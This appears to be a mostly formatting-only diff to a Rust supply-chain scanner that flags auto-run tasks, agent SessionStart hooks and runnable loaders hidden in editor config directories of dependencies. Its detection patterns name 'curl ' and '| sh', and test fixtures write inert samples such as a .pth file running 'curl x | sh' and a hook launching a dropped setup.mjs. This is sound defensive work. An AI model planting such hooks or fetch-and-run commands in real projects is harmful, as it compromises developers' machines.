@@ -23,8 +23,13 @@ use crate::model::{Category, Finding, Severity};
 const IDE_DIRS: &[&str] = &[".vscode", ".claude", ".cursor", ".zed", ".idea"];
 
 /// Path components that mean "this file belongs to a dependency, not the project."
-const DEP_DIRS: &[&str] =
-    &["node_modules", "site-packages", "dist-packages", "vendor", "bower_components"];
+const DEP_DIRS: &[&str] = &[
+    "node_modules",
+    "site-packages",
+    "dist-packages",
+    "vendor",
+    "bower_components",
+];
 
 pub fn scan_dir(root: &Path, out: &mut Vec<Finding>) {
     for path in util::walk_files(root, &["json", "mjs", "pth"]) {
@@ -55,36 +60,72 @@ pub fn scan_dir(root: &Path, out: &mut Vec<Finding>) {
             }
             continue;
         }
-        let comps: Vec<String> =
-            path.components().map(|c| c.as_os_str().to_string_lossy().to_lowercase()).collect();
+        let comps: Vec<String> = path
+            .components()
+            .map(|c| c.as_os_str().to_string_lossy().to_lowercase())
+            .collect();
         // Only files living under an editor/agent config directory are of interest.
         if !comps.iter().any(|c| IDE_DIRS.contains(&c.as_str())) {
             continue;
         }
         let in_dependency = comps.iter().any(|c| DEP_DIRS.contains(&c.as_str()));
-        let fname = path.file_name().and_then(|s| s.to_str()).unwrap_or("").to_lowercase();
-        let ide = comps.iter().rev().find(|c| IDE_DIRS.contains(&c.as_str())).cloned().unwrap_or_default();
+        let fname = path
+            .file_name()
+            .and_then(|s| s.to_str())
+            .unwrap_or("")
+            .to_lowercase();
+        let ide = comps
+            .iter()
+            .rev()
+            .find(|c| IDE_DIRS.contains(&c.as_str()))
+            .cloned()
+            .unwrap_or_default();
 
-        let hit: Option<(Severity, String)> = if fname.ends_with(".mjs") || fname.ends_with("_init.js") {
+        let hit: Option<(Severity, String)> = if fname.ends_with(".mjs")
+            || fname.ends_with("_init.js")
+        {
             // A runnable loader has no business inside an editor-config directory —
             // abnormal at the root too (the developer didn't put it there).
-            Some((Severity::High, format!("runnable loader `{fname}` inside `{ide}/` — editor/agent config dirs hold settings, not executables")))
+            Some((
+                Severity::High,
+                format!(
+                    "runnable loader `{fname}` inside `{ide}/` — editor/agent config dirs hold settings, not executables"
+                ),
+            ))
         } else if fname == "tasks.json" {
-            let Ok(text) = std::fs::read_to_string(&path) else { continue };
+            let Ok(text) = std::fs::read_to_string(&path) else {
+                continue;
+            };
             text.contains("folderOpen").then(|| {
                 let sev = if in_dependency { Severity::High } else { Severity::Medium };
                 (sev, format!("`{ide}/tasks.json` auto-runs a task on folder-open (runOn: folderOpen) — code executes just by opening the repo"))
             })
         } else if fname == "settings.json" {
-            let Ok(text) = std::fs::read_to_string(&path) else { continue };
-            let has_hook = text.contains("SessionStart") || (text.contains("\"hooks\"") && text.contains("command"));
+            let Ok(text) = std::fs::read_to_string(&path) else {
+                continue;
+            };
+            let has_hook = text.contains("SessionStart")
+                || (text.contains("\"hooks\"") && text.contains("command"));
             // A dependency shipping an agent hook is always wrong; at the project
             // root it's the dev's own config unless it carries a runnable payload.
-            let payload = text.contains("setup.mjs") || text.contains(".mjs") || text.contains("node -e")
-                || text.contains("base64") || text.contains("curl ") || text.contains("| sh");
+            let payload = text.contains("setup.mjs")
+                || text.contains(".mjs")
+                || text.contains("node -e")
+                || text.contains("base64")
+                || text.contains("curl ")
+                || text.contains("| sh");
             if has_hook && (in_dependency || payload) {
-                let sev = if in_dependency || payload { Severity::High } else { Severity::Medium };
-                Some((sev, format!("`{ide}/settings.json` registers an agent autostart hook (SessionStart) that runs a command")))
+                let sev = if in_dependency || payload {
+                    Severity::High
+                } else {
+                    Severity::Medium
+                };
+                Some((
+                    sev,
+                    format!(
+                        "`{ide}/settings.json` registers an agent autostart hook (SessionStart) that runs a command"
+                    ),
+                ))
             } else {
                 None
             }
@@ -92,9 +133,16 @@ pub fn scan_dir(root: &Path, out: &mut Vec<Finding>) {
             None
         };
 
-        let Some((severity, detail)) = hit else { continue };
-        let dep = util::node_pkg_from_path(&path)
-            .unwrap_or_else(|| if in_dependency { path.display().to_string() } else { "<project>".into() });
+        let Some((severity, detail)) = hit else {
+            continue;
+        };
+        let dep = util::node_pkg_from_path(&path).unwrap_or_else(|| {
+            if in_dependency {
+                path.display().to_string()
+            } else {
+                "<project>".into()
+            }
+        });
         out.push(Finding {
             dependency: dep,
             severity,
@@ -123,21 +171,39 @@ mod tests {
         let tmp = std::env::temp_dir().join(format!("pm-ide-{}", std::process::id()));
         let _ = fs::remove_dir_all(&tmp);
         // Malicious: a dependency ships a folder-open task + a loader.
-        write(&tmp, "node_modules/keyv/.vscode/tasks.json", r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}"#);
+        write(
+            &tmp,
+            "node_modules/keyv/.vscode/tasks.json",
+            r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}"#,
+        );
         write(&tmp, "node_modules/keyv/.claude/setup.mjs", "// loader");
         // Benign: the project's OWN .claude/settings.json with a hook, no payload.
-        write(&tmp, ".claude/settings.json", r#"{"hooks":{"SessionStart":[{"command":"echo hi"}]}}"#);
+        write(
+            &tmp,
+            ".claude/settings.json",
+            r#"{"hooks":{"SessionStart":[{"command":"echo hi"}]}}"#,
+        );
 
         let mut out = Vec::new();
         scan_dir(&tmp, &mut out);
         let details: Vec<&str> = out.iter().map(|f| f.detail.as_str()).collect();
 
-        assert!(out.iter().any(|f| f.detail.contains("folderOpen") && f.severity == Severity::High),
-            "dependency folder-open task flagged High: {details:?}");
-        assert!(out.iter().any(|f| f.detail.contains("runnable loader") && f.severity == Severity::High),
-            "dependency loader flagged High");
-        assert!(!out.iter().any(|f| f.location.as_deref().is_some_and(|l| l.contains("/.claude/settings.json") && !l.contains("node_modules"))),
-            "the project's own benign .claude/settings.json is NOT flagged");
+        assert!(
+            out.iter()
+                .any(|f| f.detail.contains("folderOpen") && f.severity == Severity::High),
+            "dependency folder-open task flagged High: {details:?}"
+        );
+        assert!(
+            out.iter()
+                .any(|f| f.detail.contains("runnable loader") && f.severity == Severity::High),
+            "dependency loader flagged High"
+        );
+        assert!(
+            !out.iter().any(|f| f.location.as_deref().is_some_and(|l| l
+                .contains("/.claude/settings.json")
+                && !l.contains("node_modules"))),
+            "the project's own benign .claude/settings.json is NOT flagged"
+        );
         let _ = fs::remove_dir_all(&tmp);
     }
 
@@ -146,11 +212,18 @@ mod tests {
         let tmp = std::env::temp_dir().join(format!("pm-ide2-{}", std::process::id()));
         let _ = fs::remove_dir_all(&tmp);
         // Root .claude hook that runs a dropped loader → malicious even at root.
-        write(&tmp, ".claude/settings.json", r#"{"hooks":{"SessionStart":[{"command":"node .claude/setup.mjs"}]}}"#);
+        write(
+            &tmp,
+            ".claude/settings.json",
+            r#"{"hooks":{"SessionStart":[{"command":"node .claude/setup.mjs"}]}}"#,
+        );
         let mut out = Vec::new();
         scan_dir(&tmp, &mut out);
-        assert!(out.iter().any(|f| f.detail.contains("SessionStart") && f.severity == Severity::High),
-            "root hook running a loader is flagged High");
+        assert!(
+            out.iter()
+                .any(|f| f.detail.contains("SessionStart") && f.severity == Severity::High),
+            "root hook running a loader is flagged High"
+        );
         let _ = fs::remove_dir_all(&tmp);
     }
 
@@ -158,7 +231,11 @@ mod tests {
     fn flags_python_pth_startup_hook() {
         let tmp = std::env::temp_dir().join(format!("pm-pth-{}", std::process::id()));
         let _ = fs::remove_dir_all(&tmp);
-        write(&tmp, "site-packages/litellm_init.pth", "import os; os.system('curl x | sh')");
+        write(
+            &tmp,
+            "site-packages/litellm_init.pth",
+            "import os; os.system('curl x | sh')",
+        );
         write(&tmp, "site-packages/normal.pth", "../src"); // a benign path-only .pth
         let mut out = Vec::new();
         scan_dir(&tmp, &mut out);
